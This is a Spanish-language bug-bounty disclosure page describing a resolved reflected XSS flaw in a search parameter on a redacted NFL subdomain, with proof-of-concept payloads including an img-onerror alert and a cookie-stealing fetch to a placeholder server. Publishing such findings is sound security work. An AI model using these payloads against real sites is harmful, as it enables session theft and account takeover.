---
layout: default
submission_id: "e8471382-6e56-4e74-b4e2-ff20279371ff"
official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279371ff"
---

<div class="container">
  <div class="lang-switcher">
    <a href="/en/bounties/e8471382-6e56-4e74-b4e2-ff20279371ff/" class="lang-btn"><span class="label-full">English (EN)</span><span class="label-short">EN</span></a>
    <a href="./" class="lang-btn active"><span class="label-full">Español (ES)</span><span class="label-short">ES</span></a>
  </div>
<article>
  <a href="/es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>

  <div class="bounty-header">
    <h1>XSS Reflejado en Parámetro de Query de Búsqueda en URL</h1>
    <p style="color: var(--p3); font-weight: 600;">National Football League (NFL)</p>
  </div>

  <div class="bounty-content">
    <h2>🎯 Resumen de la Vulnerabilidad</h2>
    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>[REDACTED].nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>

    <h2>🛠️ Payloads de Prueba de Concepto</h2>
    
    <h3>Inyección HTML</h3>
    <p>Lo primero que probamos en el campo de búsqueda fue una simple inyección HTML:</p>
    <pre><code>&lt;h1&gt;This is a HTML Injection test&lt;/h1&gt; --- This is a normal text.</code></pre>
    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/c66b7ce8002a0bc07c1e01756b0f7b6f.png" alt="Inyección HTML">

    <h3>XSS Reflejado</h3>
    <p>Después de probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona:</p>
    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/ff5e6f6181a879b65dee22d396ac3c75.png" alt="Prueba de Alerta">

    <h3>XSS Reflejado con exfiltración de Cookies</h3>
    <p>Tras verificar que podíamos ejecutar código JavaScript, intentamos exfiltrar las cookies para robar datos de sesión.</p>
    <pre><code>&lt;img/src/onerror=fetch("http://tu-servidor-web/"+encodeURIComponent(document.cookie))&gt;</code></pre>
    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/52b7f32d1681e1aa49561d1b6e8f52c9.png" alt="Payload de Exfiltración de Cookies">
    <img src="/assets/images/e8471382-6e56-4e74-b4e2-ff20279371ff/7b0e77b3db46e0d8de3558376f153ed0.png" alt="Resultado de la Exfiltración">

    <h2>🤝 Detalle de Colaboración</h2>
    <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
    <div class="collab-grid">
      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.ivan.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.ivan.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 7v10l9 5 9-5V7L12 2zm0 2.5l6.5 3.6v7.8L12 17.5l-6.5-3.6v-7.8L12 4.5z"/><path d="M10 9h4v6h-4V9zm1-1h2v2h-2V8z"/></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.ivan.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>

      <div class="collab-card">
        <div class="collab-avatar">
          <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
        </div>
        <div class="collab-body">
          <div class="collab-name">{{ site.researchers.diego.name }}</div>
          <div class="collab-links">
            <a class="social-pill" href="{{ site.researchers.diego.bugcrowd }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 7v10l9 5 9-5V7L12 2zm0 2.5l6.5 3.6v7.8L12 17.5l-6.5-3.6v-7.8L12 4.5z"/><path d="M10 9h4v6h-4V9zm1-1h2v2h-2V8z"/></svg>
              <span>Bugcrowd</span>
            </a>
            <a class="social-pill" href="{{ site.researchers.diego.linkedin }}" target="_blank" rel="noopener noreferrer">
              <svg class="svg-icon" viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4V9h4v2"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
              <span>LinkedIn</span>
            </a>
          </div>
        </div>
      </div>
    </div>

    <div class="meta-grid">
      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Estado</strong>
          </div>
        </div>
        <div class="meta-badge success">Resuelto</div>
      </div>

      <div class="meta-card">
        <div class="meta-left">
          <div class="meta-icon">
            <svg class="svg-icon" viewBox="0 0 24 24"><path d="M12 9v4"></path><path d="M12 17h.01"></path><path d="M10.29 3.86l-8.12 14.06A2 2 0 0 0 3.9 21h16.2a2 2 0 0 0 1.73-3.08L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
          </div>
          <div class="meta-title">
            <strong>Severidad</strong>
          </div>
        </div>
        <div class="meta-badge badge badge-p3">Media</div>
      </div>
    </div>

    <div class="verification-panel">
      <h3>Verificación</h3>
      <div class="verification-grid">
        <div class="verification-item">
          <small>ID de la submission</small>
          <div class="value">{{ page.submission_id | default: 'N/A' }}</div>
        </div>
        <div class="verification-item">
          <small>Enlace oficial</small>
          <div class="value">
            {% if page.official_link %}
              <a href="{{ page.official_link }}" target="_blank" rel="noopener noreferrer">{{ page.official_link }}</a>
            {% else %}
              N/A
            {% endif %}
          </div>
        </div>
      </div>
    </div>
  </div>
</article>
</div>

<!-- Image Zoom Overlay -->
<div id="zoomOverlay" class="zoom-overlay">
  <img id="zoomImg" src="" alt="Imagen Ampliada">
</div>

<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    const overlay = document.getElementById('zoomOverlay');
    const zoomImg = document.getElementById('zoomImg');
    zoomImg.src = img.src;
    overlay.classList.add('active');
  });
});

document.getElementById('zoomOverlay').addEventListener('click', () => {
  document.getElementById('zoomOverlay').classList.remove('active');
});

document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
